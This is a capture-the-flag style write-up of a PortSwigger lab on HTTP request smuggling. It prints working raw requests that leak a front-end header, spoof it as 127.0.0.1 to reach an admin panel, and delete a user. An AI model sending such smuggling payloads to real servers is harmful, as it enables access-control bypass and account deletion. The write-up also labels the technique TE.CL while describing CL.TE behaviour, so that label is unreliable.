# Exploiting HTTP - request smuggling to reveal front-end request rewriting

## 📌 Lab Details
- **Title**: Exploiting HTTP request smuggling to reveal front-end request rewriting
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/9028757aac9d890a1120a8eafe6d820ba114de27c132ee12c8ae8525c9378c40?referrer=%2fweb-security%2frequest-smuggling%2fexploiting%2flab-reveal-front-end-request-rewriting

## 🔍 Summary
This lab exploited a **TE.CL request smuggling** flaw where the front-end ignores chunked encoding but the back-end processes it. By smuggling an extra request, we first leaked the internal IP header (`X-abcdef-Ip`), then spoofed it as `127.0.0.1` to access `/admin` and delete the user `carlos`.

## 🛠 Steps to Solve
1. Browse to `/admin` and observe that the admin panel can only be loaded from `127.0.0.1`.
2. Use the site's search function and observe that it reflects the value of the `search` parameter.
3. Use **Burp Repeater** to issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 124
   Transfer-Encoding: chunked

   0

   POST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 200
   Connection: close

   search=test
   ```
4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
5. Make a note of the name of the `X-*-IP` header in the rewritten request, and use it to access the admin panel:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 143
   Transfer-Encoding: chunked

   0

   GET /admin HTTP/1.1
   X-abcdef-Ip: 127.0.0.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10
   Connection: close

   x=1
   ```
6. Using the previous response as a reference, change the smuggled request URL to delete the user `carlos`:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 166
   Transfer-Encoding: chunked

   0

   GET /admin/delete?username=carlos HTTP/1.1
   X-abcdef-Ip: 127.0.0.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 10
   Connection: close

   x=1
   ```
   
## 📖 Key Takeaways
- **TE.CL attack works when** the front-end ignores `Transfer-Encoding` but the back-end uses it.
- `Content-Length` must match the total size (in bytes) of your chunked body for the front-end to forward it without waiting.
- Smuggled requests can **leak internal headers** or **bypass access controls**.
- Internal IP spoofing works if the trusted IP is taken from a header added by the front-end.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ab430d63-a0b0-4987-96c2-4db1948d67ef" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/22f03a5b-96af-4d8d-95cb-058a7e11a314" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/de34cc37-d12a-48ea-828a-857231b54a01" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c353830c-f9d8-49b9-a6f9-d0d664a77e4c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2afbb5ba-c679-4e38-a624-ac9adb136e81" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/35c1723a-67de-4497-8d9c-60717e9fa53f" />
